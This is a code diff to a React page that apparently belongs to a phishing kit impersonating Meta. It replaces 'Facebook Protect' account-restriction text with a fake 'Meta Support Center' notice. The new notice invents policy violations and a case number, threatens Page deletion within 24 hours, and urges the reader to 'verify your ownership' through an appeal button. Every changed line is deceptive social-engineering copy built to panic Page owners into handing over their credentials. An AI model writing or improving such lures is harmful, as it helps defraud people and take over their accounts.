@@ -122,13 +122,13 @@ const Page: FC = () => {
 
     const welcomeTextsToTranslate = useMemo(
         () => [
-            'Welcome To Facebook Protect.',
-            "Your account's accessibility is limited, so we ask that higher security requirements be applied to that account. We created this security program to unlock your Pages.",
-            'More information',
-            "We've enabled advanced protections to unlock your Page.",
-            'Below, we walk you through the process in detail and help you fully activate to unlock your Page.',
-            'Continue',
-            'Your account was restricted on'
+            'Meta Support Center: Account Violation Verification',
+            "Our system has detected multiple severe violations of Meta's Terms of Service and Community Standards on your Page. Case file CASE_#2026_88591244 has been created, and your Page is scheduled for permanent deletion within the next 24 hours. Please review the violation details to submit an urgent appeal.",
+            'Review report',
+            "Violation evidence and case history file have been generated.",
+            'Click the button below to view the detailed violation report and verify your ownership to file an appeal.',
+            'View Violations & Appeal Now',
+            'Your Page is scheduled for permanent removal on'
         ],
         []
     );
